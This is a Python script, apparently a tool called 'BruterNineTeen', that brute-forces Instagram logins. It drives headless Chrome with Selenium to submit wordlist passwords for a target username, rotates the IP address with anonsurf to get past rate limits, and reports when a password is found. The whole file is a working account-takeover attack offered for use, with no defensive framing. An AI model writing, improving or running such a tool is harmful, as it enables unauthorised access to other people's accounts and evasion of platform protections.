#!/usr/bin/python3
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.chrome.service import Service
from clint.textui import colored
from selenium.webdriver.common.keys import Keys
import subprocess
import time
import os
import sys
from bs4 import BeautifulSoup
import sys
from clint.textui import colored
import optparse
import time
from clint.textui import colored
from threading import Thread

a=subprocess.check_output(["id"])
if not "root" in a.decode():
    print(colored.red("[-]This Feature Requires Root Permission. Please Be Sure That You Are Root!"))
    exit()
def ip_changer():
    print(colored.red("[")+colored.green("+")+colored.red("]")+"Changing Your Ip Address For Security Purposes Please Wait.")
    os.system("xterm -e anonsurf start")
def ip_stop():
    os.system("xterm -e anonsurf stop")
with open("Passwords/entered_passwords.txt","w") as f:
    f.write("BruterNineTeen Entered Passwords:\n----------------------------------\n")
with open("Passwords/not_entered_passwords.txt","w") as fil:
    fil.write("BruterNineTeen Not Entered Passwords:\n----------------------------------\n")
def start_insta(username):
    global driver
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('disable-infobars')
    options.add_experimental_option('prefs', {'intl.accept_languages': 'en,en_US'})
    options.add_argument("user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36")
    loc=os.getcwd()
    serv=Service("%s/path/chromedriver"%loc)
    driver = webdriver.Chrome(options=options,service=serv)
    
    driver.get("https://instagram.com")
    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[2]/div/label/input"))).send_keys(username)
def ig_brute(username,password_wordlist):
    ip_changer()
    ip_adr=subprocess.check_output(["curl","icanhazip.com","-s"])
    ip_adr=ip_adr.decode()
    print(colored.red("-")*50)
    print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("Your Ip Address Has Been Changed To:")+colored.blue(str(ip_adr)))
    print(colored.red("[")+colored.magenta("!")+colored.red("]")+colored.yellow("Speed Of The Attack Depends On The Proxy Server.It Could Be Fast Or Slow."))
    print(colored.red("-")*50)
    start_insta(username)
    x=0
    while(x<=len(password_wordlist)):
        try:
            WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input'))).send_keys(Keys.CONTROL,"a",Keys.DELETE)
            WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input'))).send_keys(password_wordlist[x])
            time.sleep(1)
            
            time.sleep(1)
            with open("Passwords/entered_passwords.txt","a+") as fi:
                fi.write("\n"+password_wordlist[x])
        except:
            continue
        try:
            captcha=WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[7]/p'))).text
            if "your password was incorrect." in captcha:
                print(colored.red("[-]Password Is Not:")+colored.magenta(password_wordlist[x]))
                
            elif "a problem" in captcha or "couldn't connect to Instagram" in captcha:
                if x>0:
                    x=x-1
               
                print(colored.red("[")+colored.green("+")+colored.red("]")+"Changing Your Ip Address For Security Purposes Please Wait.")
                os.system("xterm -e anonsurf restart")
                ip_adr=subprocess.check_output(["curl","icanhazip.com","-s"])
                ip_adr=ip_adr.decode()
                print(colored.red("-")*50)
                print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("Your Ip Address Has Been Changed To:")+colored.blue(str(ip_adr)))
                print(colored.red("[")+colored.magenta("!")+colored.red("]")+colored.yellow("Speed Of The Attack Depends On The Proxy Server.It Could Be Fast Or Slow."))
                print(colored.red("-")*50)
                start_insta(username)
                WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input'))).send_keys(Keys.CONTROL,"a",Keys.DELETE)
                WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input'))).send_keys(password_wordlist[x])
                time.sleep(3)
                
           
                time.sleep(1)
                
                with open("Passwords/entered_passwords.txt","a+") as fi:
                    fi.write("\n"+password_wordlist[x])
            else:
                print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x]))
        except:
            try:
                WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[3]/section/nav/div[2]/div/div/div[2]/div/div"))).click()
                print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x]))
                break
                exit()
            except:
                try:
                    #/html/body/div[1]/section/main/div/article/div/div[3]/div/a[1]
                    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[1]/section/main/div/article/div/div[3]/div/a[1]"))).click()
                    print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x]))
                    break
                    exit()
                except:
                    #/html/body/div[1]/section/nav/div[2]/div/div/div[1]/a/div/div/img
                    try:
                        WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[1]/section/nav/div[2]/div/div/div[1]/a/div/div/img"))).click()
                        print(colored.green("[+]Password FOUND!! -->")+colored.blue(password_wordlist[x]))
                        break
                        exit()
                    except:
                        pass
        x+=1
        
    for j in password_wordlist:
        with open("Passwords/entered_passwords.txt","r") as fenerbahce:
            same=fenerbahce.readlines()
        if not j in same:
            with open("Passwords/not_entered_passwords.txt","a+") as file:
                file.write(j)